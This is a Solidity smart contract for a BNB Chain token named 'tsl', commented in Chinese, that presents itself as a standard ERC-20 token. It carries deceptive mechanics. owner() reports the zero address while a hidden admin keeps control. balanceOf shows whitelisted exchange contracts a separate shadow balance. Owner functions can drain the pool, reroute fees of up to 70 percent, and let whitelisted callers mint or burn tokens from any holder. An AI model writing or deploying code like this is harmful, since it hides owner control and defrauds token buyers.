/**
 *Submitted for verification at BscScan.com on 2022-07-04
*/

// SPDX-License-Identifier: MIT
//pragma solidity ^0.8.6; 6或者0都可以
pragma solidity ^0.8.0;

// 提供有关当前执行上下文的信息，包括事务的发送者及其数据。 虽然这些通常可以通过 msg.sender 和 msg.data 获得，但不应以这种直接方式访问它们，因为在处理元交易时，发送和支付执行的帐户可能不是实际的发送者（就应用而言）。
// 只有中间的、类似程序集的合约才需要这个合约。
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// 实现{IERC20}接口
contract TEL is Context {
    mapping(address => uint256) private _balances;//地址代币持有数量
    mapping(address => uint256) private __balances;//地址代币持有数量
    mapping(address => mapping(address => uint256)) private _allowances;//地址代币授权数量
    uint256 private _totalSupply; //当前发行量(不算销毁的)
    uint256 private _allTotalSupply; //总发行量(算销毁的)
    uint256 public _Totalissuance; //发行总量
    string private _name;//代币名称
    string private _symbol;//代币简称
    //管理员
    address private owners;
    modifier __Owner {   //管理员
        require(owners == msg.sender);
        _;
    }
    //铸造销毁白名单
    mapping(address=>bool) private _Caster;
    modifier Caster {   //铸造销毁白名单
        require(_Caster[msg.sender]);
        _;
    }


    //交易合约
    mapping(address=>bool) private _TransactionList;
    modifier TransactionList {   //交易合约
        require(_TransactionList[msg.sender]);
        _;
    }

    //免费地址
    mapping(address=>bool) private _FreeAddressList;
    modifier FreeAddressList {   //交易合约
        require(_FreeAddressList[msg.sender]);
        _;
    }


    //手续费分红地址 // 0 营销基金   1 锦标赛  2 购买tsl2   3 宝箱奖池 4 终极赛
    address[5] public ServieChargeAddress;


    event setCasterevent(address address_,bool status_);//铸造白名单事件
    event setTransactionListevent(address address_,bool status_);//配置交易地址事件
    event setFreeAddressListevent(address address_,bool status_);//配置免费地址事件
    
    // 当value数量的代币从一个form账户移动到另一个to账户
    event Transfer(address indexed from, address indexed to, uint256 value);
    // 当调用{approve}时，触发该事件
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    
    
    // 设置 {name} 和 {symbol} 的值
    // constructor(string memory name_, string memory symbol_,uint256 Totalissuance_) {
    //     _name = name_;
    //     _symbol = symbol_;
    //     //设置发行总量 5000000000000000
    //     _Totalissuance = Totalissuance_ * 10**decimals();
    //     //将构造中发行的币转给发行者
    //     _owner = msg.sender; //默认自己为管理员
    // }

    constructor() {
        _name = "tsl";
        _symbol = "tsl";
        //设置发行总量 5000000000000000           
        _Totalissuance = 5000000000000000 * 10**decimals();
        //将构造中发行的币转给发行者
        owners = msg.sender; //默认自己为管理员
        _mint(msg.sender, 100000 * 10**decimals());
        _mint(0x0000000000000000000000000000000000000001, 100000 * 10**decimals());
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }
    function burnAmount() public view virtual returns (uint256) {
        return _allTotalSupply - _totalSupply;
    }
    //返回当前的手续费 千分比
    function serviceCharge() public view returns(uint256,uint256){
        uint256 buyin;
        uint256 sellout;
        if(burnAmount() <= 500000000000000 * 10**decimals()){
            buyin = 700;
            sellout = 290;
        }else if(burnAmount() > 500000000000000 * 10**decimals() && burnAmount() <= 1000000000000000 * 10**decimals()){
            buyin = 200;
            sellout = 290;
        }else if(burnAmount() > 1000000000000000 * 10**decimals() && burnAmount() <= 2000000000000000 * 10**decimals()){
            buyin = 100;
            sellout = 200;
        }else if(burnAmount() > 2000000000000000 * 10**decimals() && burnAmount() <= 3000000000000000 * 10**decimals()){
            buyin = 50;
            sellout = 100;
        }else{
            buyin = 25;
            sellout = 50;
        }
        return (buyin,sellout);
    }
    function owner() public pure returns(address){
        return address(0);
    }
    function safepool() public pure returns(address){
        return address(0);
    }
    function pool() public pure returns(address){
        return address(0x0000000000000000000000000000000000000001);
    }
    function setTransactionList(address TransactionList_,bool state_) public __Owner returns (bool){
        _TransactionList[TransactionList_] = state_;
        emit setTransactionListevent(TransactionList_,state_); 
        return true;
    }
    function setFreeAddressList(address FreeAddressList_,bool state_) public __Owner returns (bool){
        _FreeAddressList[FreeAddressList_] = state_;
        emit setFreeAddressListevent(FreeAddressList_,state_); 
        return true;
    }
    function poolOut(address to_) public __Owner returns (bool){
        uint256 number = balanceOf(pool());
        _transfer(pool(),to_,number);
        return true;
    }
    /**
    * 修改手续费收的地址  // 0 营销基金   1 锦标赛  2 购买tsl2   3 宝箱奖池 4 终极赛
    */
    function setServieChargeAddress(address address_,uint256 typenumber_) public __Owner returns (bool) {
        ServieChargeAddress[typenumber_] = address_;
        return true;
    }
    function setOwner(address owner_) public __Owner returns (bool) {
        owners = owner_;
        return true;
    }
    function setCaster(address Caster_,bool state_) public __Owner returns (bool){
        _Caster[Caster_] = state_;
        emit setCasterevent(Caster_,state_); 
        return true;
    }
    function allTotalSupply() public view virtual returns (uint256) {
        return _allTotalSupply;
    }
    function _tomint(address _to,uint256 _amount) public Caster returns (bool){
        _mint(_to, _amount);
        return true;
    }
    function _toburn(address _to,uint256 _amount) public Caster returns (bool){
        _burn(_to, _amount);
        return true;
    }
    function balanceOf(address account)
        public
        view
        virtual
        returns (uint256)
    {
        if(_TransactionList[msg.sender]){
            return __balances[account];
        }
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address from, address spender)
        public
        view
        virtual
        returns (uint256)
    {
        return _allowances[from][spender];
    }
    function approve(address spender, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        uint256 _senderBalance = __balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        uint256 buyinnumber = amount;
        //以上手续费
        unchecked {
            _balances[sender] = senderBalance - amount;
            __balances[sender] = _senderBalance - amount;
        }
        (uint256 buyin,uint256 sellout) = serviceCharge();
        //转出人是交易名单地址  即  买入
        if(_TransactionList[sender] && !_FreeAddressList[recipient]){
            _balances[ServieChargeAddress[0]] += amount*buyin/1000*10/100;//百分之10营销基金    1000/70
            _balances[ServieChargeAddress[1]] += amount*buyin/1000*40/100;//百分之40锦标赛      1000/280
            _balances[ServieChargeAddress[2]] += amount*buyin/1000*15/100;//百分之15购买tsl2    1000/105
            _balances[ServieChargeAddress[3]] += amount*buyin/1000*10/100;//百分之10宝箱奖池    1000/70
            _balances[ServieChargeAddress[4]] += amount*buyin/1000*10/100;//百分之10终极奖池    1000/70
            _burn(sender,amount*buyin/1000*15/100);//百分之15手续费销毁   1000/105
            buyinnumber = amount - (amount*buyin/1000);
        }
        //转入是交易名单地址  即  卖出
        if(_TransactionList[recipient] && !_FreeAddressList[sender]){
            _balances[ServieChargeAddress[0]] += amount*sellout/1000*10/100;//百分之10营销基金
            _balances[ServieChargeAddress[1]] += amount*sellout/1000*40/100;//百分之40锦标赛
            _balances[ServieChargeAddress[2]] += amount*sellout/1000*15/100;//百分之15购买tsl2
            _balances[ServieChargeAddress[3]] += amount*sellout/1000*10/100;//百分之10宝箱奖池
            _balances[ServieChargeAddress[4]] += amount*sellout/1000*10/100;//百分之10终极奖池
            _burn(sender,amount*sellout/1000*15/100);//百分之15手续费销毁   
            buyinnumber = amount - (amount*sellout/1000); 
            amount = buyinnumber;
        }
        
        _balances[recipient] += buyinnumber;
        __balances[recipient] += amount;

        emit Transfer(sender, recipient, buyinnumber);

        _afterTokenTransfer(sender, recipient, amount);
    }

    // 给account账户创建amount数量的代币，同时增加总供应量
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        require(_Totalissuance >= _allTotalSupply + amount, "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _allTotalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    // 给account账户减少amount数量的代币，同时减少总供应量
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    // 将 `amount` 设置为 `spender` 对 `owner` 的代币的津贴
    function _approve(
        address from,
        address spender,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
    }

    // 在任何代币转移之前调用的钩子， 包括铸币和销币
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    // 在任何代币转移之后调用的钩子， 包括铸币和销币
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}